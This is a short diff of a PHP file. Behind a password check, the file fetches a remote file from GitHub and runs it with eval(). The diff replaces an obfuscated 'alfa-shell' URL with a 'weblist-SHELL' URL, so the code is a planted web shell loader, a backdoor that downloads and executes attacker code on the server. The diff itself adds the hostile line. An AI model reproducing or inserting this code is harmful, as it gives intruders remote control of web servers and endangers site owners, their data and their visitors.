@@ -911,7 +911,7 @@ if (isset($_POST["password"])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo("https://raw.githubusercontent.com/nicxlau/alfa-shell/refs/heads/master/alfa-obfuscated.php");
+    $a = geturlsinfo("https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php");
     eval("?>" . $a);
 } else {
     ?>
